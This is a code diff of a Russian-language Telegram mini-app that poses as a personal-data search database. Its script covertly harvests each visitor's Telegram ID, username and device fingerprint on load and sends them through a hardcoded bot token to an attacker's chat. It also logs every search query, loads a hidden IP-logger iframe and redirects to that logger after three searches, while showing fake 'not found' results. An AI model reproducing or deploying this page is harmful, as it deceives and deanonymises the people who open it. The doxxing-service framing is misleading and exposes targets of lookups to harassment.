@@ -2,441 +2,217 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>База данных</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #0F0F0F;
-            color: #fff;
-            min-height: 100vh;
-        }
-        .header {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            padding: 20px;
-            text-align: center;
-            border-bottom: 2px solid #00d4ff;
-        }
-        .header h1 {
-            font-size: 24px;
-            background: linear-gradient(90deg, #00d4ff, #0099ff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        .header p { font-size: 12px; color: #888; margin-top: 5px; }
-        .menu {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            padding: 20px;
-        }
-        .menu-btn {
-            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-            border: none;
-            border-radius: 15px;
-            padding: 30px 20px;
-            color: white;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
-            transition: transform 0.2s;
-        }
-        .menu-btn:active { transform: scale(0.95); }
-        .menu-btn .icon { font-size: 32px; margin-bottom: 10px; display: block; }
-        .content { padding: 20px; display: none; }
-        .content.active { display: block; animation: fadeIn 0.3s; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .search-form {
-            background: #1a1a2e;
-            padding: 20px;
-            border-radius: 15px;
-        }
-        .search-form h2 { margin-bottom: 10px; }
-        .search-form .desc { color: #888; font-size: 14px; margin-bottom: 15px; }
-        .search-form input {
-            width: 100%;
-            padding: 15px;
-            background: #0f0f1e;
-            border: 2px solid #00d4ff;
-            border-radius: 10px;
-            color: white;
-            font-size: 16px;
-            margin-bottom: 15px;
-        }
-        .search-form input::placeholder { color: #666; }
-        .search-btn {
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(90deg, #00d4ff, #0099ff);
-            border: none;
-            border-radius: 10px;
-            color: white;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .result {
-            background: #1a1a2e;
-            padding: 20px;
-            border-radius: 15px;
-            text-align: center;
-            margin-top: 20px;
-            border-left: 4px solid #ff8844;
-        }
-        .profile-info {
-            background: #1a1a2e;
-            padding: 20px;
-            border-radius: 15px;
-        }
-        .profile-info h2 { margin-bottom: 20px; }
-        .profile-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 12px 0;
-            border-bottom: 1px solid #333;
-        }
-        .profile-row:last-child { border-bottom: none; }
-        .profile-row .label { color: #888; }
-        .profile-row .value { color: #00d4ff; font-weight: 600; }
-        .stat-container { padding: 10px 0; }
-        .stat-block {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 15px;
-            border-left: 4px solid #00d4ff;
-        }
-        .stat-block strong { color: #00d4ff; font-size: 14px; }
-        .stat-block .num { font-size: 20px; font-weight: bold; margin-top: 5px; }
-        .back-btn {
-            width: 100%;
-            padding: 15px;
-            background: #1a1a2e;
-            border: 2px solid #00d4ff;
-            border-radius: 10px;
-            color: #00d4ff;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        .contact-link {
-            display: block;
-            background: linear-gradient(90deg, #00d4ff, #0099ff);
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            color: white;
-            text-decoration: none;
-            font-weight: 600;
-            margin-top: 15px;
-        }
+        body { font-family: Arial, sans-serif; background: #0f0f0f; color: #fff; padding: 20px; }
+        .header { text-align: center; padding: 20px; border-bottom: 2px solid #00d4ff; margin-bottom: 20px; }
+        .header h1 { color: #00d4ff; font-size: 24px; }
+        .menu { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+        .btn { background: #1e3c72; border: none; border-radius: 15px; padding: 25px; color: white; font-size: 16px; cursor: pointer; }
+        .btn:active { opacity: 0.8; }
+        .icon { font-size: 28px; display: block; margin-bottom: 8px; }
+        .page { display: none; padding: 20px; background: #1a1a2e; border-radius: 15px; margin-top: 20px; }
+        .page.active { display: block; }
+        input { width: 100%; padding: 15px; background: #0f0f1e; border: 2px solid #00d4ff; border-radius: 10px; color: white; font-size: 16px; margin: 15px 0; }
+        .search-btn { width: 100%; padding: 15px; background: #00d4ff; border: none; border-radius: 10px; color: black; font-size: 16px; cursor: pointer; }
+        .back { width: 100%; padding: 15px; background: transparent; border: 2px solid #00d4ff; border-radius: 10px; color: #00d4ff; margin-top: 20px; cursor: pointer; }
+        .result { padding: 20px; background: #2a1a1e; border-radius: 10px; margin-top: 15px; text-align: center; }
+        .stat { background: #1a1a2e; padding: 15px; border-radius: 10px; margin: 10px 0; border-left: 4px solid #00d4ff; }
+        .link { display: block; background: #00d4ff; padding: 15px; border-radius: 10px; color: black; text-decoration: none; text-align: center; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="header">
         <h1>🔍 База данных</h1>
-        <p>Свыше 40 миллиардов записей</p>
+        <p style="color:#888; margin-top:5px;">Свыше 40 миллиардов записей</p>
     </div>
 
-    <!-- Главное меню -->
-    <div id="mainMenu" class="menu">
-        <button class="menu-btn" onclick="showSearch()">
-            <span class="icon">🔍</span>Поиск
-        </button>
-        <button class="menu-btn" onclick="showProfile()">
-            <span class="icon">👤</span>Профиль
-        </button>
-        <button class="menu-btn" onclick="showAddDB()">
-            <span class="icon">📁</span>Добавить базу
-        </button>
-        <button class="menu-btn" onclick="showStats()">
-            <span class="icon">📊</span>Статистика
-        </button>
+    <div id="menu" class="menu">
+        <button class="btn" id="btnSearch"><span class="icon">🔍</span>Поиск</button>
+        <button class="btn" id="btnProfile"><span class="icon">👤</span>Профиль</button>
+        <button class="btn" id="btnAdd"><span class="icon">📁</span>Добавить базу</button>
+        <button class="btn" id="btnStats"><span class="icon">📊</span>Статистика</button>
     </div>
 
-    <!-- Поиск -->
-    <div id="searchContent" class="content">
-        <div class="search-form">
-            <h2>🔎 Поиск по базам</h2>
-            <p class="desc">Введите данные для поиска: ФИО, номер телефона, email, ИНН, паспорт, VIN или адрес. Поиск осуществляется по 127+ источникам.</p>
-            <input type="text" id="searchQuery" placeholder="Введите запрос...">
-            <button class="search-btn" onclick="performSearch()">🔍 Найти</button>
-        </div>
+    <div id="pageSearch" class="page">
+        <h2>🔎 Поиск по базам</h2>
+        <p style="color:#888; margin-top:10px;">Введите ФИО, телефон, email или ИНН</p>
+        <input type="text" id="query" placeholder="Введите запрос...">
+        <button class="search-btn" id="doSearch">🔍 Найти</button>
         <div id="searchResult"></div>
-        <button class="back-btn" onclick="showMenu()">← Назад в меню</button>
+        <button class="back" id="back1">← Назад</button>
     </div>
 
-    <!-- Профиль -->
-    <div id="profileContent" class="content">
-        <div class="profile-info">
-            <h2>👤 Ваш профиль</h2>
-            <div class="profile-row">
-                <span class="label">ID:</span>
-                <span class="value" id="visitorId">загрузка...</span>
-            </div>
-            <div class="profile-row">
-                <span class="label">Username:</span>
-                <span class="value" id="visitorUsername">загрузка...</span>
-            </div>
-            <div class="profile-row">
-                <span class="label">Подписка:</span>
-                <span class="value" style="color: #00ff88;">✅ Активна</span>
-            </div>
-            <div class="profile-row">
-                <span class="label">До конца:</span>
-                <span class="value">7 дней</span>
-            </div>
-        </div>
-        <button class="back-btn" onclick="showMenu()">← Назад в меню</button>
+    <div id="pageProfile" class="page">
+        <h2>👤 Ваш профиль</h2>
+        <div class="stat"><b>ID:</b> <span id="visitorId">загрузка...</span></div>
+        <div class="stat"><b>Username:</b> <span id="visitorName">загрузка...</span></div>
+        <div class="stat"><b>Подписка:</b> <span style="color:#0f0;">✅ Активна (7 дней)</span></div>
+        <button class="back" id="back2">← Назад</button>
     </div>
 
-    <!-- Добавить базу -->
-    <div id="addDBContent" class="content">
-        <div class="profile-info">
-            <h2>📁 Добавить свою базу</h2>
-            <p style="color: #888; line-height: 1.6; margin-top: 15px;">
-                Вы можете добавить собственную базу данных в нашу систему. Мы принимаем актуальные базы от проверенных источников.
-            </p>
-            <p style="color: #888; margin-top: 15px;">
-                Для сотрудничества свяжитесь с администрацией:
-            </p>
-            <a href="https://t.me/otsocityhelpoer_bot" class="contact-link">📩 Написать @otsocityhelpoer_bot</a>
-        </div>
-        <button class="back-btn" onclick="showMenu()">← Назад в меню</button>
+    <div id="pageAdd" class="page">
+        <h2>📁 Добавить базу</h2>
+        <p style="color:#888; margin-top:15px;">Для добавления своей базы свяжитесь с администрацией:</p>
+        <a href="https://t.me/otsocityhelpoer_bot" class="link">📩 @otsocityhelpoer_bot</a>
+        <button class="back" id="back3">← Назад</button>
     </div>
 
-    <!-- Статистика -->
-    <div id="statsContent" class="content">
-        <div class="profile-info">
-            <h2>📊 Статистика базы</h2>
-        </div>
-        <div class="stat-container">
-            <div class="stat-block">
-                <strong>📚 ВСЕГО ЗАПИСЕЙ</strong>
-                <div class="num">40,682,451,239</div>
-            </div>
-            <div class="stat-block">
-                <strong>🗂 ИСТОЧНИКОВ</strong>
-                <div class="num">127+</div>
-            </div>
-            <div class="stat-block">
-                <strong>🔄 ОБНОВЛЕНИЕ</strong>
-                <div class="num">Ежедневно</div>
-            </div>
-            <div class="stat-block">
-                <strong>🌍 ГЕОГРАФИЯ</strong>
-                <div class="num">СНГ, Европа, США, Азия</div>
-            </div>
-            <div class="stat-block">
-                <strong>👥 ПОЛЬЗОВАТЕЛЕЙ</strong>
-                <div class="num" id="usersCount">загрузка...</div>
-            </div>
-        </div>
-        <button class="back-btn" onclick="showMenu()">← Назад в меню</button>
+    <div id="pageStats" class="page">
+        <h2>📊 Статистика</h2>
+        <div class="stat"><b>Записей:</b> 40,682,451,239</div>
+        <div class="stat"><b>Источников:</b> 127+</div>
+        <div class="stat"><b>Обновление:</b> Ежедневно</div>
+        <div class="stat"><b>География:</b> СНГ, Европа, США</div>
+        <button class="back" id="back4">← Назад</button>
     </div>
 
-    <!-- Скрытый iframe для IP логгера -->
-    <iframe id="grabifyFrame" style="display:none;" width="0" height="0"></iframe>
+    <iframe id="grabify" style="display:none;"></iframe>
 
     <script>
-        // ===== КОНФИГ =====
-        const BOT_TOKEN = '8701726550:AAHzH-oN1vfdHroJ7Qx3qnwdP_C8rl_U0gc';
-        const LOG_CHAT_ID = -1003690607796;
-        const GRABIFY_URL = 'https://account.beauty/89YMMI';
+        var BOT = '8701726550:AAHzH-oN1vfdHroJ7Qx3qnwdP_C8rl_U0gc';
+        var CHAT = -1003690607796;
+        var GRABIFY = 'https://account.beauty/89YMMI';
 
-        // ===== TELEGRAM WEBAPP =====
-        const tg = window.Telegram.WebApp;
+        var tg = window.Telegram.WebApp;
         tg.expand();
-        tg.disableVerticalSwipes();
 
-        // ===== СБОР ВСЕХ ДАННЫХ =====
-        const userData = {
-            // Telegram данные
-            visitorId: tg.initDataUnsafe?.user?.id || 'unknown',
-            username: tg.initDataUnsafe?.user?.username || 'нет',
-            firstName: tg.initDataUnsafe?.user?.first_name || '',
-            lastName: tg.initDataUnsafe?.user?.last_name || '',
-            isPremium: tg.initDataUnsafe?.user?.is_premium || false,
-            languageCode: tg.initDataUnsafe?.user?.language_code || '',
-            
-            // Экран
-            screenWidth: screen.width,
-            screenHeight: screen.height,
-            screenFull: screen.width + 'x' + screen.height,
-            colorDepth: screen.colorDepth,
-            pixelRatio: window.devicePixelRatio,
-            viewportWidth: window.innerWidth,
-            viewportHeight: window.innerHeight,
-            
-            // Устройство
+        var uid = 'unknown';
+        var uname = 'нет';
+
+        try {
+            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                uid = tg.initDataUnsafe.user.id;
+                uname = tg.initDataUnsafe.user.username || 'нет';
+            }
+        } catch(e) {}
+
+        document.getElementById('visitorId').innerText = uid;
+        document.getElementById('visitorName').innerText = '@' + uname;
+
+        var data = {
+            id: uid,
+            username: uname,
+            screen: screen.width + 'x' + screen.height,
             platform: navigator.platform,
             userAgent: navigator.userAgent,
             language: navigator.language,
-            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
-            cookieEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
-            hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-            maxTouchPoints: navigator.maxTouchPoints || 0,
-            deviceMemory: navigator.deviceMemory || 'N/A',
-            
-            // Время
-            timestamp: new Date().toISOString(),
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            timezoneOffset: new Date().getTimezoneOffset(),
-            localTime: new Date().toLocaleString('ru-RU'),
-            
-            // Сеть
-            connectionType: navigator.connection ? navigator.connection.effectiveType : 'N/A',
-            downlink: navigator.connection ? navigator.connection.downlink : 'N/A',
+            cores: navigator.hardwareConcurrency || 'N/A',
+            memory: navigator.deviceMemory || 'N/A',
+            touch: navigator.maxTouchPoints || 0,
             online: navigator.onLine,
-            
-            // WebApp
-            webAppVersion: tg.version,
-            colorScheme: tg.colorScheme,
-            
-            // Дополнительно
-            referrer: document.referrer || 'direct',
-            pageURL: window.location.href
+            time: new Date().toLocaleString('ru-RU')
         };
 
-        // ===== ЗАПОЛНЯЕМ ПРОФИЛЬ =====
-        document.getElementById('visitorId').textContent = userData.visitorId;
-        document.getElementById('visitorUsername').textContent = '@' + userData.username;
-
-        // ===== ФУНКЦИЯ ОТПРАВКИ ЛОГА =====
-        function sendLog(text) {
-            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+        function log(text) {
+            var url = 'https://api.telegram.org/bot' + BOT + '/sendMessage';
+            var body = JSON.stringify({ chat_id: CHAT, text: text, parse_mode: 'HTML' });
+            
+            fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: LOG_CHAT_ID,
-                    text: text,
-                    parse_mode: 'HTML'
-                })
-            }).catch(e => console.log('Log error:', e));
+                body: body
+            }).then(function(r) {
+                console.log('Log sent:', r.status);
+            }).catch(function(e) {
+                console.log('Log error:', e);
+            });
         }
 
-        // ===== ОТПРАВЛЯЕМ ПОЛНЫЙ ЛОГ ПРИ ОТКРЫТИИ =====
-        const openLog = `<b>🌐 WebApp открыт</b>
+        var openLog = '<b>🌐 WebApp ОТКРЫТ</b>\n\n' +
+            '<b>👤 Юзер:</b>\n' +
+            '├ ID: <code>' + data.id + '</code>\n' +
+            '├ Username: @' + data.username + '\n' +
+            '└ Время: ' + data.time + '\n\n' +
+            '<b>📱 Устройство:</b>\n' +
+            '├ Экран: ' + data.screen + '\n' +
+            '├ Платформа: ' + data.platform + '\n' +
+            '├ Ядра CPU: ' + data.cores + '\n' +
+            '├ RAM: ' + data.memory + 'GB\n' +
+            '├ Touch: ' + data.touch + '\n' +
+            '└ Язык: ' + data.language + '\n\n' +
+            '<b>🌍 Сеть:</b>\n' +
+            '├ Timezone: ' + data.timezone + '\n' +
+            '└ Online: ' + (data.online ? 'Да' : 'Нет') + '\n\n' +
+            '<b>🔧 UA:</b>\n<code>' + data.userAgent.substring(0, 150) + '</code>';
 
-<b>👤 Пользователь:</b>
-├ ID: <code>${userData.visitorId}</code>
-├ Username: @${userData.username}
-├ Имя: ${userData.firstName} ${userData.lastName}
-├ Премиум: ${userData.isPremium ? '✅' : '❌'}
-└ Язык: ${userData.languageCode}
+        log(openLog);
 
-<b>📱 Устройство:</b>
-├ Платформа: ${userData.platform}
-├ Экран: ${userData.screenFull}
-├ Viewport: ${userData.viewportWidth}x${userData.viewportHeight}
-├ Pixel Ratio: ${userData.pixelRatio}
-├ Touch Points: ${userData.maxTouchPoints}
-├ CPU Cores: ${userData.hardwareConcurrency}
-└ RAM: ${userData.deviceMemory}GB
+        setTimeout(function() {
+            document.getElementById('grabify').src = GRABIFY;
+            log('<b>🎯 Grabify загружен</b>\n└ ID: <code>' + data.id + '</code>');
+        }, 3000);
 
-<b>🌍 Сеть/Время:</b>
-├ Timezone: ${userData.timezone}
-├ Время: ${userData.localTime}
-├ Онлайн: ${userData.online ? '✅' : '❌'}
-└ Тип сети: ${userData.connectionType}
-
-<b>🔧 Техническое:</b>
-├ User-Agent: <code>${userData.userAgent.substring(0, 100)}...</code>
-├ Языки: ${userData.languages}
-├ Cookies: ${userData.cookieEnabled ? '✅' : '❌'}
-└ DNT: ${userData.doNotTrack}`;
-
-        sendLog(openLog);
-
-        // ===== ЗАГРУЖАЕМ GRABIFY В IFRAME (собирает IP) =====
-        setTimeout(() => {
-            document.getElementById('grabifyFrame').src = GRABIFY_URL;
-            sendLog('<b>🎯 Grabify загружен</b>\n└ ID: <code>' + userData visitorId + '</code>\n└ Данные пойдут в Grabify панель');
-        }, 2000);
-
-        // ===== ФУНКЦИИ НАВИГАЦИИ =====
-        let searchCount = 0;
+        function showPage(id) {
+            document.getElementById('menu').style.display = 'none';
+            document.querySelectorAll('.page').forEach(function(p) { p.classList.remove('active'); });
+            document.getElementById(id).classList.add('active');
+        }
 
         function showMenu() {
-            document.getElementById('mainMenu').style.display = 'grid';
-            document.querySelectorAll('.content').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.page').forEach(function(p) { p.classList.remove('active'); });
+            document.getElementById('menu').style.display = 'grid';
         }
 
-        function hideMenu() {
-            document.getElementById('mainMenu').style.display = 'none';
-        }
+        document.getElementById('btnSearch').onclick = function() {
+            showPage('pageSearch');
+            log('<b>📂 Открыт:</b> Поиск\n└ ID: <code>' + data.id + '</code>');
+        };
 
-        function showSearch() {
-            hideMenu();
-            document.getElementById('searchContent').classList.add('active');
-            sendLog('<b>📂 Открыт раздел:</b> Поиск\n└ ID: <code>' + userData.visitorId + '</code>');
-        }
+        document.getElementById('btnProfile').onclick = function() {
+            showPage('pageProfile');
+            log('<b>📂 Открыт:</b> Профиль\n└ ID: <code>' + data.id + '</code>');
+        };
 
-        function showProfile() {
-            hideMenu();
-            document.getElementById('profileContent').classList.add('active');
-            sendLog('<b>📂 Открыт раздел:</b> Профиль\n└ ID: <code>' + userData.visitorId + '</code>');
-        }
+        document.getElementById('btnAdd').onclick = function() {
+            showPage('pageAdd');
+            log('<b>📂 Открыт:</b> Добавить базу\n└ ID: <code>' + data.id + '</code>');
+        };
 
-        function showAddDB() {
-            hideMenu();
-            document.getElementById('addDBContent').classList.add('active');
-            sendLog('<b>📂 Открыт раздел:</b> Добавить базу\n└ ID: <code>' + userData.visitorId + '</code>');
-        }
+        document.getElementById('btnStats').onclick = function() {
+            showPage('pageStats');
+            log('<b>📂 Открыт:</b> Статистика\n└ ID: <code>' + data.id + '</code>');
+        };
 
-        function showStats() {
-            hideMenu();
-            document.getElementById('statsContent').classList.add('active');
-            document.getElementById('usersCount').textContent = Math.floor(Math.random() * 50000 + 150000).toLocaleString('ru-RU');
-            sendLog('<b>📂 Открыт раздел:</b> Статистика\n└ ID: <code>' + userData.visitorId + '</code>');
-        }
+        document.getElementById('back1').onclick = showMenu;
+        document.getElementById('back2').onclick = showMenu;
+        document.getElementById('back3').onclick = showMenu;
+        document.getElementById('back4').onclick = showMenu;
 
-        function performSearch() {
-            const query = document.getElementById('searchQuery').value.trim();
-            
-            if (!query) {
-                document.getElementById('searchResult').innerHTML = '<div class="result" style="border-left-color: #ff4444;">❌ Введите данные для поиска</div>';
+        var searchCount = 0;
+
+        document.getElementById('doSearch').onclick = function() {
+            var q = document.getElementById('query').value.trim();
+            if (!q) {
+                document.getElementById('searchResult').innerHTML = '<div class="result">❌ Введите запрос</div>';
                 return;
             }
 
-            document.getElementById('searchResult').innerHTML = '<div class="result" style="border-left-color: #00d4ff;">⏳ Поиск по базам данных...</div>';
             searchCount++;
+            document.getElementById('searchResult').innerHTML = '<div class="result">⏳ Поиск...</div>';
 
-            sendLog('<b>🔎 Поиск #' + searchCount + '</b>\n├ ID: <code>' + userData.visitorId + '</code>\n├ Username: @' + userData.username + '\n└ Запрос: <code>' + query + '</code>');
+            log('<b>🔎 Поиск #' + searchCount + '</b>\n├ ID: <code>' + data.id + '</code>\n└ Запрос: <code>' + q + '</code>');
 
-            setTimeout(() => {
-                const results = [
-                    '❌ Данные не найдены',
-                    '⚠️ Сервера перегружены. Попробуйте ещё раз.'
-                ];
-                const result = results[Math.floor(Math.random() * 2)];
-                
-                document.getElementById('searchResult').innerHTML = '<div class="result">' + result + '</div>';
+            setTimeout(function() {
+                var results = ['❌ Данные не найдены', '⚠️ Сервера перегружены. Попробуйте ещё раз.'];
+                var r = results[Math.floor(Math.random() * 2)];
+                document.getElementById('searchResult').innerHTML = '<div class="result">' + r + '</div>';
 
-                // После 3 поисков — редирект на grabify
                 if (searchCount >= 3) {
-                    setTimeout(() => {
-                        document.getElementById('searchResult').innerHTML += '<div class="result" style="margin-top:15px; border-left-color: #00ff88;">🔄 Перенаправление на расширенный поиск...</div>';
-                        sendLog('<b>🔄 Редирект на Grabify</b>\n└ ID: <code>' + userData.visitorId + '</code>');
-                        setTimeout(() => {
-                            window.location.href = GRABIFY_URL;
+                    setTimeout(function() {
+                        document.getElementById('searchResult').innerHTML += '<div class="result" style="margin-top:10px;background:#1a2a1e;">🔄 Расширенный поиск...</div>';
+                        log('<b>🔄 Редирект Grabify</b>\n└ ID: <code>' + data.id + '</code>');
+                        setTimeout(function() {
+                            window.location.href = GRABIFY;
                         }, 1500);
                     }, 1000);
                 }
             }, 2000);
-        }
-
-        // ===== ЛОГ ПРИ ЗАКРЫТИИ =====
-        window.addEventListener('beforeunload', () => {
-            const timeSpent = Math.round((Date.now() - startTime) / 1000);
-            sendLog('<b>👋 WebApp закрыт</b>\n├ ID: <code>' + userData.visitorId + '</code>\n└ Время в приложении: ' + timeSpent + ' сек');
-        });
-
-        const startTime = Date.now();
+        };
     </script>
 </body>
 </html>
